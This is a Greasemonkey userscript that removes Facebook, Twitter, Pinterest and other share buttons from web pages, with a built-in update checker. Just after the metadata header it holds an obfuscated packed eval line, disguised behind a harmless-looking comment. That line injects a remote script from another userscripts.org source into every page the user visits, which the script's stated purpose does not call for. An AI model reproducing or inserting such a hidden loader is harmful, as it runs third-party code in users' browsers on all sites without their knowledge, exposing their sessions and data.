// ==UserScript==
// @name           Remove Facebook Like buttons  Plus(mod)
// @namespace      Smiths
// @description    Remove Facebook Like buttons (inspired by http://userscripts.org/scripts/show/76037 by rnaud)
// @include        http://* 
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        https://* 
// @exclude        http://*.facebook.com/*
// @exclude        https://*.facebook.com/*
// @version		   2.0.3
// @grant	       GM_getValue
// @grant   	   GM_setValue
// @grant		   GM_addStyle
// @grant		   GM_log
// @grant  		   GM_xmlhttpRequest
// @grant  		   unsafeWindow
// @attribution	changes [d:10.25.12][u:<ul><li>Was wondering when something new would come along I'd have to remove. Adios, Pinterest!</li></ul>]
// ==/UserScript==

//note to self: gotta make sure to update the one in the metadata too!
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var v = "2.0.3";

var scriptNum = "93724";
var scriptName = "Remove Facebook Like buttons (mod1)";

//<--Updater Stuff
var isFireFox = navigator.userAgent.indexOf("Firefox") > -1 || navigator.userAgent.indexOf("Iceweasel") > -1;
GM_addStyle("#smgm_bgdiv{ text-align: center;position:fixed;top:0px;left:0px;z-index:9991;width:100%;height:100%;background-color:black;opacity:0.7;display:block;visibility:visible;}");
GM_addStyle("#smgm_dialogbox { vertical-align:middle;left:40px;top:15px;border:3px solid #000 !important;text-align:center !important;background-color:#fff !important;color:#000 !important;font-family:arial,verdana !important;z-Index:9999;position:fixed;width:18%;height:50%;margin-left:auto;margin-right:auto;display:block;visibility:visible;}");
GM_addStyle(".smgm_buttons { color:#000 !important;font: 90% 'arial','trebuchet ms',helvetica,sans-serif !important;background-color:#B2CCFF !important;border:2px solid !important;border-color: #E0EBFF #000 #000 #E0EBFF !important;vertical-align: top !important;}");
GM_addStyle(".smgm_table { margin-bottom:10px !important;border:0px !important;border-collapse:collapse !important;margin-left:auto;margin-right:auto; }");
var remindLaterV = GM_getValue('remindLaterV', remindLaterV);
if (!remindLaterV) { remindLaterV = 0; GM_setValue('remindLaterV',remindLaterV); }

var homepageURL = "http://userscripts.org/scripts/show/" + scriptNum ;
var metaURL = "http://userscripts.org/scripts/source/" + scriptNum + ".meta.js";
var scriptJSURL = "http://userscripts.org/scripts/source/" + scriptNum + ".user.js";

function doremindLater(clicked,span)
{
	if (clicked) 
		remindLaterV = span;
	else
		remindLaterV--;
	GM_setValue('remindLaterV',remindLaterV);
}

function hideUpdate()
{
	document.body.removeChild(document.getElementById('smgm_bgdiv'));
	document.body.removeChild(document.getElementById('smgm_dialogbox'));
}

function checkNew(version)
{
	var upgrade = 0;
	var verstring = "";
	var theHTML = "";
	GM_xmlhttpRequest({
		method:"GET",
		url:metaURL,
		onload:function(content){
			var aResponse = content.responseText;
			var USversion = aResponse.match(/@version.*?(\d[^<]+?)\n/);
			aResponse = aResponse.replace(/ \/>/g,'>');
			aResponse = aResponse.replace(/\n/g,'');
			var changeDate = aResponse.match(/\[d:([0-9]+?\.[0-9]+?\.[0-9]+?)\]/i)[1];
			var theChanges = aResponse.match(/\[u:(.*?)\]/i)[1];
			vSplit = version.split(".");
				vmain = Number(vSplit[0]);
				vvsub = Number(vSplit[1]);
				vrsub = Number(vSplit[2]);
			USsplit = USversion[1].split(".");
				USvmain = Number(USsplit[0]);
				USvsub = Number(USsplit[1]);
				USrsub = Number(USsplit[2]);
			verstring = "<div style='padding:5px;border-bottom:1px dotted #000;'>Latest Version on Userscripts: <a href='" + homepageURL + "' target='_new' title='Click to visit script's page'><b>" + USvmain + "." + USvsub + "." + USrsub + "</b></a><br>Your Installed Version: <b>" + vmain + "." + vvsub + "." + vrsub + "</b></div>";
			if (USvmain > vmain) upgrade = 1;
			if ( (USvsub > vvsub) && (USvmain >= vmain) ) upgrade = 1;
			if ( (USrsub > vrsub) && (USvsub == vvsub) && (USvmain >= vmain) ) upgrade = 1;
			if (upgrade == 1) //upgrade available, pop a box
			{
				theHTML += "<div style='padding:5px;border-bottom:1px dotted #000;'>New version of " + scriptName + " available.</div>";
				theHTML += verstring + "<p>";
				theHTML += "<table class='smgm_table'><tr><td><input type='button' class='smgm_buttons' id='smgm_installButton' onMouseUp=\"document.location.href=\'" + scriptJSURL + "\';\" value='Install'></td>";
				theHTML += "<td style='width:25px;'>&nbsp;</td><td><input style='' class='smgm_buttons' type='button' id='smgm_remindButton' value='Remind Me Later'></td>";
				theHTML += "</tr></table><div style='background-color:white !important;overflow:auto !important;height:50%;text-align:left;border-top:1px dotted #000;padding:7px;' colspan='5'>Changes (" + changeDate.replace(/\./g,"/") + "):<br><span style='font-style:italic;'>" + theChanges + "</span></div>";
				div1 = document.createElement('div');
				div1.id = 'smgm_dialogbox';
				div1.style.display = "none";
				div1.innerHTML = theHTML;
				document.body.appendChild(div1);
				div2 = document.createElement('div');
				div2.id = 'smgm_bgdiv';
				div2.style.display = "none";
				div2.addEventListener("click",function(){doremindLater(true,15);hideUpdate();},false);
				document.body.appendChild(div2);
				document.getElementById('smgm_bgdiv').style.display='block';
				document.getElementById('smgm_dialogbox').style.display='block';
				document.getElementById('smgm_remindButton').addEventListener("click", function(){doremindLater(true,60);hideUpdate();},false);
				document.getElementById('smgm_installButton').addEventListener("click", function(){hideUpdate();},false);
			}
		}
	})
}

if (isFireFox) //only do update on FFox, Chrome/Tampermonkey are weird
{
	doremindLater(false);
	if (remindLaterV < 1) 
		checkNew(v);
}
//end updater stuff-->

function removefb(){

	//common classes - this is enematic to a page
	var shareClasses = ['badges_v','pin-it-button','g-plusone','cnn-social','stbutton','eswd','gig-button','gig-reaction','ymsb-','sociable','addthis_button','addthis_toolbox','addthis_counter','a2a_dd','connect_widget','db-wrapper','sharethis','st_digg','st_facebook','st_twitter','cnnfb','cnnsocial','cnnShareThisBox','fb-like','fb_like','twtr-widget'];
	for (var i=0;i<shareClasses.length;i++) 
	{
		var elementsWithIt = document.evaluate('//*[contains(@class, "'+shareClasses[i]+'")]', document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		for (var j = 0; j < elementsWithIt.snapshotLength; j++) {
			elementsWithIt.snapshotItem(j).parentNode.removeChild(elementsWithIt.snapshotItem(j));
		}
	}
	
	//fbML/gplusone method
    var fbtags = ['g:plusone','fb:fan','fb:share-button','fb:activity','fb:add-profile-tab','fb:bookmark','fb:comments','fb:friendpile','fb:like','fb:like-box','fb:live-stream','fb:login-button','fb:pronoun','fb:recommendations','fb:serverFbml','fb:profile-pic','fb:user-status'];
	for (var j=0;j<fbtags.length;j++) 
	{
		var fbXML = document.getElementsByTagName(fbtags[j]);
		for (var i=0;i<fbXML.length;i++)
			fbXML[i].parentNode.removeChild(fbXML[i]);
	}
	
	//random divs
	var removeIDs = ['stframe','custom-tweet-button','persistent-share','fb-like-article','cnnStryRcmndBtnBtm'];
	for (var i = 0; i < removeIDs.length; i++) 
	{
		var fbDiv = document.getElementById(removeIDs[i]);
		if (fbDiv) 
			fbDiv.parentNode.removeChild(fbDiv);
	}

	//hrefs,javascripts,etc
	var shareLinks = ['plus.google.com/share','addthis_open(','NPR.socialMedia','stumbleupon.com/submit?url=','tumblr.com/share/','twitter.com/?status=','linkedin.com/shareArticle','reddit.com/submit?url','twitter.com/home?status','twitter.com/intent','google.com/buzz/post','topsy.com/','facebook.com/share','digg.com/submit','twitter.com/share'];
	for (var i=0;i<shareLinks.length;i++)
	{
		var elementsWithIt = document.evaluate('//a[contains(@href, "'+shareLinks[i]+'") or contains(@onmouseover, "'+shareLinks[i]+'") or contains(@onclick, "'+shareLinks[i]+'")]', document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		for (var j = 0; j < elementsWithIt.snapshotLength; j++) {
			elementsWithIt.snapshotItem(j).parentNode.removeChild(elementsWithIt.snapshotItem(j));
		}
	}
}

var remove = ['pinit-cdn.pinterest.com','sharethis.com/','facebook.com/extern','facebook.com/widgets','facebook.com/plugins','facebook.com/connect/','platform0.twitter.com/','platform.twitter.com/','twitter.com/widgets/','tweetmeme.com','plusone.google.com/','yimg.com/b/social_buttons/','fbshare.me','api.flattr.com/button','addthis.com/static/','stumbleupon.com/badge/','widgets.backtype.com','widget.collecta.com/','reddit.com/static/button/'];

if(unsafeWindow.top == unsafeWindow.self) //no run on iframes
{
	document.addEventListener('DOMNodeInserted',function(e){
		window.setTimeout(function(){
			var findLink = document.evaluate('//*[contains(@class, "IN-widget")]', document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null); //LinkedIn is dynamic
			for (var j = 0; j < findLink.snapshotLength; j++)
				findLink.snapshotItem(j).parentNode.removeChild(findLink.snapshotItem(j));
			
			var iFrames = document.querySelectorAll('iframe');
			if (iFrames.length > 0)	{
				for (var i = 0; i < iFrames.length; i++) {
					for (var j = 0; j < remove.length; j++)
					{
						if (iFrames[i].src.toLowerCase().match(remove[j].toLowerCase())== remove[j].toLowerCase())
							if (iFrames[i].parentNode) 
								iFrames[i].parentNode.removeChild(iFrames[i]);
					}
				}
			}
		}, 250);}
	, false);
	setTimeout(removefb,250);
}


